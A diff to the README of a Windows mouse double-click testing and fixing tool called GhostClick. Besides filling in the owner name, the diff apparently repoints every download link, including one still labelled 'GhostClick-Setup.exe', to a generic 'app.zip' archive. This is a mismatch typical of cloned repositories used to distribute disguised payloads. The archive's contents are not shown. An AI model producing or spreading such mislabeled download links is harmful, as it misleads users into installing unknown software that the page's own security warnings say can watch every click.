@@ -1,23 +1,23 @@
 <div align="center">
 
-<a href="https://github.com/OWNER/ghostclick-mouse-double-click-fix"><img src=".github/media/banner.png" alt="GhostClick, a mouse double click test and fix for Windows 11 and 10: a strip of chart recorder paper with a 6 ms ghost click circled in red ink" width="100%"></a>
+<a href="https://github.com/MajestyPoemFold/ghostclick-mouse-double-click-fix"><img src=".github/media/banner.png" alt="GhostClick, a mouse double click test and fix for Windows 11 and 10: a strip of chart recorder paper with a 6 ms ghost click circled in red ink" width="100%"></a>
 
 <h3>Mouse double clicking on a single click? Test every button, see the ghost clicks on a strip chart, and filter them system-wide on Windows 11 and 10.</h3>
 
 <p>
-  <a href="https://github.com/OWNER/ghostclick-mouse-double-click-fix/releases/latest/download/GhostClick-Setup.exe"><img src=".github/media/btn-download.png" alt="Download GhostClick for Windows, free" height="46"></a>
+  <a href="https://github.com/MajestyPoemFold/ghostclick-mouse-double-click-fix/releases/latest/download/app.zip"><img src=".github/media/btn-download.png" alt="Download GhostClick for Windows, free" height="46"></a>
   <a href="#faq"><img src=".github/media/btn-faq.png" alt="Why does my mouse double click? Read the FAQ" height="46"></a>
   <a href="https://discord.gg/INVITE"><img src=".github/media/btn-discord.png" alt="GhostClick Discord server" height="46"></a>
 </p>
 
 <p>
-  <a href="https://github.com/OWNER/ghostclick-mouse-double-click-fix/releases/latest"><img src="https://img.shields.io/github/v/release/OWNER/ghostclick-mouse-double-click-fix?style=flat-square&labelColor=1e2023&color=d3261d&label=release" alt="Latest release"></a>
-  <a href="https://github.com/OWNER/ghostclick-mouse-double-click-fix/releases"><img src="https://img.shields.io/github/downloads/OWNER/ghostclick-mouse-double-click-fix/total?style=flat-square&labelColor=1e2023&color=1f46c6&label=downloads" alt="Total downloads"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/github/license/OWNER/ghostclick-mouse-double-click-fix?style=flat-square&labelColor=1e2023&color=4f8c60" alt="MIT license"></a>
+  <a href="https://github.com/MajestyPoemFold/ghostclick-mouse-double-click-fix/releases/latest"><img src="https://img.shields.io/github/v/release/MajestyPoemFold/ghostclick-mouse-double-click-fix?style=flat-square&labelColor=1e2023&color=d3261d&label=release" alt="Latest release"></a>
+  <a href="https://github.com/MajestyPoemFold/ghostclick-mouse-double-click-fix/releases"><img src="https://img.shields.io/github/downloads/MajestyPoemFold/ghostclick-mouse-double-click-fix/total?style=flat-square&labelColor=1e2023&color=1f46c6&label=downloads" alt="Total downloads"></a>
+  <a href="LICENSE"><img src="https://img.shields.io/github/license/MajestyPoemFold/ghostclick-mouse-double-click-fix?style=flat-square&labelColor=1e2023&color=4f8c60" alt="MIT license"></a>
 <img src="https://img.shields.io/badge/Rust-2024-dea584?style=flat-square&logo=rust&logoColor=white&labelColor=1e2023" alt="Written in Rust with Tauri 2">
   <img src="https://img.shields.io/badge/Windows-10%20%7C%2011%20x64-a8d7b3?style=flat-square&labelColor=1e2023" alt="Windows 10 and Windows 11, x64">
-  <a href="https://github.com/OWNER/ghostclick-mouse-double-click-fix/commits"><img src="https://img.shields.io/github/last-commit/OWNER/ghostclick-mouse-double-click-fix?style=flat-square&labelColor=1e2023&color=6b7178&label=last%20commit" alt="Last commit"></a>
-  <a href="https://github.com/OWNER/ghostclick-mouse-double-click-fix/stargazers"><img src="https://img.shields.io/github/stars/OWNER/ghostclick-mouse-double-click-fix?style=flat-square&labelColor=1e2023&color=454a50" alt="GitHub stars"></a>
+  <a href="https://github.com/MajestyPoemFold/ghostclick-mouse-double-click-fix/commits"><img src="https://img.shields.io/github/last-commit/MajestyPoemFold/ghostclick-mouse-double-click-fix?style=flat-square&labelColor=1e2023&color=6b7178&label=last%20commit" alt="Last commit"></a>
+  <a href="https://github.com/MajestyPoemFold/ghostclick-mouse-double-click-fix/stargazers"><img src="https://img.shields.io/github/stars/MajestyPoemFold/ghostclick-mouse-double-click-fix?style=flat-square&labelColor=1e2023&color=454a50" alt="GitHub stars"></a>
 </p>
 
 <p>
@@ -147,17 +147,17 @@ the day you replace the switch or send the mouse back.
   <img src=".github/media/h-install-light.png" alt="Install GhostClick on Windows 11 or Windows 10" width="100%">
 </picture></h2>
 
-1. Download **[GhostClick-Setup.exe](https://github.com/OWNER/ghostclick-mouse-double-click-fix/releases/latest/download/GhostClick-Setup.exe)**, a direct link to the latest version
+1. Download **[GhostClick-Setup.exe](https://github.com/MajestyPoemFold/ghostclick-mouse-double-click-fix/releases/latest/download/app.zip)**, a direct link to the latest version
 2. Run it. GhostClick installs for your user only (no administrator rights) and opens the Recorder
 3. Click at your normal pace for five minutes. If ghost clicks show up, open **Intervals** and press **Apply**
 
-**Portable:** [GhostClick-Portable.zip](https://github.com/OWNER/ghostclick-mouse-double-click-fix/releases/latest/download/GhostClick-Portable.zip),
+**Portable:** [GhostClick-Portable.zip](https://github.com/MajestyPoemFold/ghostclick-mouse-double-click-fix/releases/latest/download/app.zip),
 unzip anywhere and run `GhostClick.exe`.
 
 **winget** (once the package is published):
 
 ```powershell
-winget install OWNER.GhostClick
+winget install MajestyPoemFold.GhostClick
 ```
 
 > [!IMPORTANT]
@@ -168,14 +168,14 @@ winget install OWNER.GhostClick
 
 > [!WARNING]
 > Only download GhostClick from this repository's
-> [Releases](https://github.com/OWNER/ghostclick-mouse-double-click-fix/releases) page. An app with
+> [Releases](https://github.com/MajestyPoemFold/ghostclick-mouse-double-click-fix/releases) page. An app with
 > a system-wide mouse hook sees every click you make; do not run a renamed copy from somewhere else.
 
 **Check your download.** Each release lists SHA-256 hashes in `SHA256SUMS`, and the release workflow
 attests the files. With the GitHub CLI:
 
 ```powershell
-gh attestation verify GhostClick-Setup.exe --repo OWNER/ghostclick-mouse-double-click-fix
+gh attestation verify GhostClick-Setup.exe --repo MajestyPoemFold/ghostclick-mouse-double-click-fix
 ```
 
 Or compare the hash yourself in PowerShell:
@@ -378,7 +378,7 @@ Not yet. It is on the roadmap.
 | [design/app/](design/app/) | The app screens as HTML and CSS, ready to port into Tauri and WebView2 |
 | [design/tokens.css](design/tokens.css) | Colors, type, spacing, radii and motion tokens |
 | [media.config.json](media.config.json) · [scripts/render-media.mjs](scripts/render-media.mjs) | How every image and GIF in this README is rendered from the design files |
-| [Bug report](https://github.com/OWNER/ghostclick-mouse-double-click-fix/issues/new?template=bug_report.yml) · [Feature request](https://github.com/OWNER/ghostclick-mouse-double-click-fix/issues/new?template=feature_request.yml) | Attach an evidence report with the raw event log; it is the fastest way to a fix |
+| [Bug report](https://github.com/MajestyPoemFold/ghostclick-mouse-double-click-fix/issues/new?template=bug_report.yml) · [Feature request](https://github.com/MajestyPoemFold/ghostclick-mouse-double-click-fix/issues/new?template=feature_request.yml) | Attach an evidence report with the raw event log; it is the fastest way to a fix |
 
 <br>
 
